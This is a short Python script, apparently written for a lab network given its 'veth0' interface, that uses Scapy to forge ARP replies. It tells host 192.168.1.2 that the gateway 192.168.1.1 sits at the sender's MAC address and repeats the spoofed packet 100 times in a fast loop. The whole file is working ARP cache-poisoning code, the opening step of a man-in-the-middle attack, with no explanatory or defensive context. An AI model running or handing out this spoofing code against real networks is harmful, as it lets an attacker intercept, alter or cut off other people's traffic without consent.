from scapy.all import ARP, Ether, sendp

packet = Ether(dst="3a:18:70:ca:91:b2", src="e2:c8:14:a6:4f:ed") / \
         ARP(op=2, psrc="192.168.1.1", hwsrc="e2:c8:14:a6:4f:ed",
                    pdst="192.168.1.2", hwdst="3a:18:70:ca:91:b2")

# Send 100 packets as fast as possible
for i in range(100):
        sendp(packet, iface = "veth0", verbose=0)
